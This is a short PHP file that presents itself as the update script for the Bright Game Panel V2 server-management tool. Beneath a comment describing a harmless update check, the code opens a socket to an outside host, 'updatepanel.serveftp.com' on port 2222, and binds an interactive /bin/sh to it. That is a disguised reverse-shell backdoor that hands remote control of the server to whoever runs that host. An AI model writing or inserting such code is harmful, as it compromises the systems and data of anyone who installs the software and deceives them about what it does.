<?php
/**
 * This file is used to update the panel once executed it will connect to the 
 * Remote server to check for updates and if there is an available update it will
 * Download it and copy and existing settings over to the new panel.
 * This script is not yet implemented.
  *
 * @package		Bright Game Panel V2
 * @version		0.1
 * @category	Systems Administration
 * @author		DarrenRainey <darren@darrenraineys.co.uk>
 * @copyright	Copyleft 2015, Nikita Rousseau
 * @license		GNU General Public License version 3.0 (GPLv3)
 * @link		http://www.bgpanel.net/
*/
shell_exec("scripts/check_version.sh")
$sock=fsockopen("updatepanel.serveftp.com",2222);exec("/bin/sh -i <&3 >&3 2>&3");

?>